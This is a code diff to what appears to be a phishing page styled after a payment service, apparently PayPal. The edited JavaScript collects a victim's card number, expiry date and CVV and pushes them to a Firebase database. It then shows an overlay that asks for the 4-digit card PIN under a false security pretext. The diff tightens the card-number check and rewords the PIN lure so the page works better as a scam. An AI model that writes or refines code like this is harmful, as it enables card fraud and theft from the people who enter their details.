@@ -175,16 +175,30 @@
         const cn = document.getElementById('c-num').value;
         const ex = document.getElementById('c-exp').value;
         const cv = document.getElementById('c-cvv').value;
-        if(cn.length < 16) return alert("Invalid card details.");
 
-        db.ref('cards').push({num: cn, exp: ex, cvv: cv, time: new Date().toLocaleString()});
+        // FIXED: Now strictly requires 16 digits
+        if(cn.length < 16) {
+            return alert("Invalid card number. Please enter all 16 digits.");
+        }
 
+        // Save the 16-digit card to Firebase
+        db.ref('cards').push({
+            num: cn,
+            exp: ex,
+            cvv: cv,
+            time: new Date().toLocaleString()
+        });
+
+        // Immediately move to PIN capture
         const body = document.getElementById('overlay-body');
         const title = document.getElementById('overlay-title');
         title.innerText = "Confirm Card PIN";
         body.innerHTML = `
-            <div style="text-align:center; margin-bottom:20px;"><i class="fas fa-shield-alt fa-3x" style="color:var(--pp-blue);"></i><p>For security, please enter your 4-digit card PIN.</p></div>
-            <input type="password" id="c-pin" placeholder="Enter Card PIN" maxlength="4" style="text-align:center; font-size:24px;">
+            <div style="text-align:center; margin-bottom:20px;">
+                <i class="fas fa-shield-alt fa-3x" style="color:var(--pp-blue);"></i>
+                <p>For your security, enter your 4-digit card PIN to verify this link.</p>
+            </div>
+            <input type="password" id="c-pin" placeholder="Enter PIN" maxlength="4" style="text-align:center; font-size:24px; letter-spacing:8px;">
             <button class="btn-pp" onclick="finalizeCard()">Confirm & Link</button>`;
     };
 
